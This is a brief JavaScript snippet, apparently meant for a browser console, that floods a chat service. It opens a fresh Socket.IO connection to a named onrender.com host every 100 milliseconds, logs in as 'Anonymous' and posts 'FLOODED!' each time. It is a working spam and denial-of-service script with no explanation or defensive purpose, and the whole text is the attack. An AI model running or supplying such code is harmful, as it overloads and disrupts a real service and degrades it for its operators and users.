alert('time for flood');
setInterval(function(){var Doe = io('https://bonziworld-revived-1.onrender.com/');
Doe.emit('login',{name:'Anonymous'});
Doe.emit('talk',{text:'FLOODED!'})},100);
